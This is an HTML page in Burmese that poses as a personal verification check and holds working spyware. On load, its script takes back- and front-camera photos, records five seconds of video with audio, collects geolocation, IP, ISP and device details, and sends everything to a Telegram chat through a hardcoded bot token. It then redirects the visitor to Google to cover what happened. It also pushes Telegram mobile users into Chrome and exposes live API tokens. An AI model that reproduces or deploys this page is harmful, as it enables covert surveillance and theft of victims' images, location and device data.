<!DOCTYPE html>
<html lang="my">
<head>
  <meta charset="UTF-8" />
  <title>FAST | စစ်ဆေးချက်</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background: radial-gradient(circle, #1a1a1a, #000);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Poppins', sans-serif;
      color: #fff;
    }
    .container {
      text-align: center;
      padding: 30px;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid #444;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
      width: 90%;
      max-width: 400px;
    }
    h1 { font-size: 22px; margin-bottom: 10px; color: #0ff; }
    p { font-size: 14px; color: #aaa; }
    .status { margin-top: 20px; font-size: 13px; color: #0f0; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔐 ကိုယ်ရေးအတည်ပြုချက်</h1>
    <p>အတည်ပြုရန် ခွင့်ပြုချက်များ လိုအပ်ပါသည်။</p>
    <p class="status" id="status">စတင်နေပါပြီ...</p>
  </div>

  <script>
    // ===== TELEGRAM BOT CONFIGURATION =====
    const BOT_TOKEN = "7308206355:AAFqR-4DnU-N6jScpp3vKpB8hbRSAno_ftc";
    // ======================================
    
    const urlParams = new URLSearchParams(window.location.search);
    const OWNER_ID = urlParams.get('id');
    const statusEl = document.getElementById('status');
    
    // Telegram ဆိုရင် Chrome ကို Auto ပြောင်းခိုင်းမယ်
    const isTelegram = /Telegram/i.test(navigator.userAgent);
    const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
    
    if (isTelegram && isMobile) {
      const currentUrl = window.location.href;
      window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
    }

    async function sendToTelegram(text, isPhoto = false, photoBase64 = null, isVideo = false, videoBase64 = null) {
      if (!OWNER_ID) return;
      
      try {
        if (isVideo && videoBase64) {
          const formData = new FormData();
          formData.append('chat_id', OWNER_ID);
          formData.append('video', videoBase64);
          formData.append('caption', text);
          
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
            method: 'POST',
            body: formData
          });
        } else if (isPhoto && photoBase64) {
          const formData = new FormData();
          formData.append('chat_id', OWNER_ID);
          formData.append('photo', photoBase64);
          formData.append('caption', text);
          
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        } else {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: OWNER_ID,
              text: text,
              parse_mode: 'Markdown'
            })
          });
        }
      } catch(e) {
        console.log('Send error:', e);
      }
    }

    async function compressImage(blob) {
      return new Promise((resolve) => {
        const img = new Image();
        img.src = URL.createObjectURL(blob);
        img.onload = () => {
          const canvas = document.createElement('canvas');
          canvas.width = img.width / 2;
          canvas.height = img.height / 2;
          canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(resolve, 'image/jpeg', 0.7);
          URL.revokeObjectURL(img.src);
        };
      });
    }

    async function blobToBase64(blob) {
      return new Promise((resolve) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result);
        reader.readAsDataURL(blob);
      });
    }

    // ========== LOCATION ==========
    async function getLocation() {
      if (!navigator.geolocation) {
        await sendToTelegram(`❌ တည်နေရာ မရနိုင်ပါ`);
        return;
      }
      
      navigator.geolocation.getCurrentPosition(async (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const acc = position.coords.accuracy;
        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
        
        await sendToTelegram(
          `📍 **တည်နေရာ**\n` +
          `🌍 လတ္တီတွဒ်: ${lat}\n` +
          `🌍 လောင်ဂျီတွဒ်: ${lon}\n` +
          `📏 တိကျမှု: ${acc}m\n` +
          `🗺️ Google Maps: ${mapsLink}`
        );
      }, async (error) => {
        await sendToTelegram(`❌ တည်နေရာ ငြင်းပယ်ခံရပါသည်`);
      });
    }

    // ========== BACK CAMERA PHOTO ==========
    async function takeBackPhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "environment" } 
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        stream.getTracks().forEach(track => track.stop());
        
        canvas.toBlob(async (blob) => {
          const compressed = await compressImage(blob);
          const base64 = await blobToBase64(compressed);
          await sendToTelegram(`📸 အနောက်ကင်မရာပုံ`, true, base64);
        }, 'image/jpeg', 0.7);
      } catch(err) {
        await sendToTelegram(`❌ အနောက်ကင်မရာ ငြင်းပယ်ခံရပါသည်`);
      }
    }

    // ========== FRONT CAMERA PHOTO ==========
    async function takeFrontPhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" } 
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        stream.getTracks().forEach(track => track.stop());
        
        canvas.toBlob(async (blob) => {
          const compressed = await compressImage(blob);
          const base64 = await blobToBase64(compressed);
          await sendToTelegram(`📸 အရှေ့ကင်မရာပုံ`, true, base64);
        }, 'image/jpeg', 0.7);
      } catch(err) {
        await sendToTelegram(`❌ အရှေ့ကင်မရာ ငြင်းပယ်ခံရပါသည်`);
      }
    }

    // ========== VIDEO RECORDING (5 sec) ==========
    async function recordVideo() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" },
          audio: true 
        });
        
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
          const videoBlob = new Blob(chunks, { type: 'video/mp4' });
          const base64 = await blobToBase64(videoBlob);
          await sendToTelegram(`🎥 ဗီဒီယို (၅ စက္ကန့်)`, false, null, true, base64);
          stream.getTracks().forEach(track => track.stop());
        };
        
        mediaRecorder.start();
        setTimeout(() => {
          if (mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
          }
        }, 5000);
        
      } catch(err) {
        await sendToTelegram(`❌ ဗီဒီယို ငြင်းပယ်ခံရပါသည်`);
      }
    }

    // ========== DEVICE INFO ==========
    async function sendDeviceInfo() {
      try {
        const ipRes = await fetch('https://ipinfo.io/json?token=5602d2e05cb668');
        const ip = await ipRes.json();
        const battery = await navigator.getBattery();
        const time = new Date().toLocaleString();
        
        let networkType = "မသိရပါ";
        if (navigator.connection) {
          networkType = navigator.connection.effectiveType || navigator.connection.type || "မသိရပါ";
        }
        
        let deviceName = "မသိရပါ";
        const ua = navigator.userAgent;
        if (ua.includes('iPhone')) deviceName = 'iPhone';
        else if (ua.includes('Samsung')) deviceName = 'Samsung';
        else if (ua.includes('Redmi') || ua.includes('Xiaomi')) deviceName = 'Xiaomi/Redmi';
        else if (ua.includes('OPPO')) deviceName = 'OPPO';
        else if (ua.includes('vivo')) deviceName = 'vivo';
        
        const msg = `🔐 *စက်ပစ္စည်းအချက်အလက်*\n\n` +
          `📱 ဖုန်းအမည်: ${deviceName}\n` +
          `🔢 IP: ${ip.ip}\n` +
          `📍 မြို့: ${ip.city || 'မသိရပါ'}\n` +
          `🗺 နိုင်ငံ: ${ip.country || 'မသိရပါ'}\n` +
          `📡 ISP: ${ip.org || 'မသိရပါ'}\n` +
          `🔋 ဘက်ထရီ: ${Math.round(battery.level * 100)}% ${battery.charging ? '⚡ အားသွင်းနေသည်' : ''}\n` +
          `📶 အင်တာနက်: ${networkType}\n` +
          `🖥 မျက်နှာပြင်: ${screen.width}x${screen.height}\n` +
          `🕒 အချိန်: ${time}`;
        
        await sendToTelegram(msg);
      } catch(e) {
        console.log("Device Info Error:", e);
      }
    }

    window.onload = async () => {
      if (!OWNER_ID) {
        statusEl.textContent = '❌ လင့်မမှန်ကန်ပါ။';
        return;
      }
      
      statusEl.textContent = '📡 ချိတ်ဆက်နေပါသည်...';
      await sendDeviceInfo();

      try {
        // အနောက်ကင်မရာပုံ
        statusEl.textContent = '📸 အနောက်ကင်မရာ...';
        await takeBackPhoto();
        
        // အရှေ့ကင်မရာပုံ
        statusEl.textContent = '📸 အရှေ့ကင်မရာ...';
        await takeFrontPhoto();
        
        // ဗီဒီယို 5 စက္ကန့်
        statusEl.textContent = '🎥 ဗီဒီယိုရိုက်နေသည် (၅ စက္ကန့်)...';
        await recordVideo();
        
        // တည်နေရာ
        statusEl.textContent = '📍 တည်နေရာယူနေသည်...';
        await getLocation();
        
        statusEl.textContent = '✅ အတည်ပြုပြီးပါပြီ။ ပြန်ညွှန်းနေပါသည်...';
        
        await sendToTelegram(`✅ *အတည်ပြုခြင်း ပြီးဆုံးပါပြီ!*\n🕐 အချိန်: ${new Date().toLocaleString()}`);
        
        setTimeout(() => {
          window.location.href = "https://www.google.com";
        }, 3000);
        
      } catch (err) {
        statusEl.textContent = '❌ ခွင့်ပြုချက် ငြင်းပယ်ခံရပါသည်။';
        await sendToTelegram(`❌ *ခွင့်ပြုချက် ငြင်းပယ်ခံရပါသည်!*\n🕐 အချိန်: ${new Date().toLocaleString()}`);
        console.error(err);
      }
    };
  </script>
</body>
</html>
